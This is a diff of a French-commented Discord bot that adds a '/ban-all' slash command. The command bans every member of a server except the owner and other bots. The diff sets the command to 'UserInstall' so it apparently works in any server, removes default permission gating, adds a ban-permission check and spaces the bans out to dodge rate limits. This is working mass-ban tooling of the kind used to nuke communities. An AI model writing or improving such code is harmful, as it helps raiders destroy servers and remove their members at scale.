@@ -20,23 +20,22 @@ client.once('ready', async () => {
     console.log(`✅ Bot connecté en tant que ${client.user.tag}`);
     console.log(`👑 Propriétaire configuré : ${OWNER_ID}`);
 
-    const commandData = {
+    const command = {
         name: 'ban-all',
-        description: 'Bannit tous les membres du serveur sauf le propriétaire et les bots',
+        description: 'Bannit tous les membres du serveur (User Install)',
         
-        // === IMPORTANT : Permet l'utilisation partout ===
-        integration_types: ['GuildInstall', 'UserInstall'],  // Visible en User Install ET Server Install
-        contexts: [0, 1, 2], // 0 = Guild, 1 = Bot DM, 2 = Group DM
+        // Configuration pour fonctionner partout via User Install
+        integration_types: ['UserInstall'],           // ← Important : seulement UserInstall
+        contexts: [0],                                // 0 = Guild (serveur)
         
-        // On enlève default_member_permissions pour que TOUT LE MONDE puisse voir la commande
-        // On gère la restriction uniquement dans le code (seul toi peux l'utiliser)
+        // On enlève complètement default_member_permissions
     };
 
     try {
-        await client.application.commands.create(commandData);
-        console.log('✅ Commande /ban-all enregistrée en mode UserInstall + GuildInstall');
+        await client.application.commands.create(command);
+        console.log('✅ Commande /ban-all enregistrée en UserInstall (devrait marcher partout)');
     } catch (err) {
-        console.error('Erreur lors de la création de la commande:', err);
+        console.error('❌ Erreur lors de la création de la commande:', err);
     }
 });
 
@@ -53,15 +52,25 @@ client.on('interactionCreate', async interaction => {
     }
 
     // Vérification qu'on est bien dans un serveur
-    if (!interaction.guild) {
+    if (!interaction.guild || !interaction.guildId) {
         return interaction.reply({
-            content: '❌ Cette commande ne peut être utilisée que dans un serveur.',
+            content: '❌ Cette commande doit être utilisée dans un serveur.',
+            ephemeral: true
+        });
+    }
+
+    // Vérification que le bot a les permissions nécessaires dans le serveur
+    const botMember = await interaction.guild.members.fetchMe().catch(() => null);
+    if (!botMember || !botMember.permissions.has(PermissionFlagsBits.BanMembers)) {
+        return interaction.reply({
+            content: '❌ Le bot n\'a pas la permission de bannir des membres dans ce serveur.\n\n' +
+                    'Il faut que tu ajoutes le bot avec les permissions nécessaires ou que tu lui donnes le rôle Administrateur.',
             ephemeral: true
         });
     }
 
     await interaction.reply({ 
-        content: '🚨 **BAN ALL EN COURS...** Ne ferme pas Discord. Cela peut prendre plusieurs minutes.',
+        content: '🚨 **BAN ALL EN COURS...** Cela peut prendre plusieurs minutes. Ne ferme pas Discord.',
         ephemeral: false 
     });
 
@@ -70,7 +79,7 @@ client.on('interactionCreate', async interaction => {
     let skipped = 0;
 
     try {
-        const members = await interaction.guild.members.fetch();
+        const members = await interaction.guild.members.fetch({ withPresences: false });
 
         for (const [id, member] of members) {
             if (id === OWNER_ID || member.user.bot || !member.bannable) {
@@ -84,7 +93,7 @@ client.on('interactionCreate', async interaction => {
                     deleteMessageSeconds: 0
                 });
                 banned++;
-                await new Promise(r => setTimeout(r, 700)); // Anti-rate limit
+                await new Promise(r => setTimeout(r, 800)); // Anti rate-limit plus sécurisé
             } catch (err) {
                 failed++;
             }
@@ -99,7 +108,9 @@ client.on('interactionCreate', async interaction => {
 
     } catch (error) {
         console.error(error);
-        await interaction.followUp({ content: '❌ Une erreur grave est survenue.' });
+        await interaction.followUp({ 
+            content: '❌ Une erreur grave est survenue pendant le ban all.' 
+        });
     }
 });
 
